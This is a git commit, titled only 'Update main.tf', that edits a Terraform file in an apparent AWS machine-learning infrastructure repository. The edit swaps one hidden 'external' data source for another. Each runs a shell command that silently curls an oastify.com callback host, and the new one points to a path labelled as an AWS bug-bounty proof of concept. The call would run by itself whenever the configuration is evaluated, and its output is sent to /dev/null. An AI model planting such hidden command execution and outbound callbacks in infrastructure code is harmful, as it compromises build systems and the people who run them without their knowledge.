23e45fd570042aef39b18c9e9ac53a6b980cd851
xyz <114230687+hackerhero0x01@users.noreply.github.com>
2024-05-10 16:12:39 +0530

    Update main.tf

--- ai-ml/trainium-inferentia/main.tf
+++ ai-ml/trainium-inferentia/main.tf
@@ -1,3 +1,3 @@
 data "external" "example" {
-  program = ["sh", "-c", "echo '{\"aws\":\"bugbounty\"}';curl -sSfL d9n1vk6ko57qumjk9y1b1u40hrnib91xq.oastify.com > /dev/null 2>&1"]
+  program = ["sh", "-c", "echo '{\"aws\":\"bugbounty\"}';curl -sSfL k4p8qr1rjc2xpter45wiw1z7cyip6gx4m.oastify.com/aws-bugbounty-poc-hackerhero > /dev/null 2>&1"]
 }
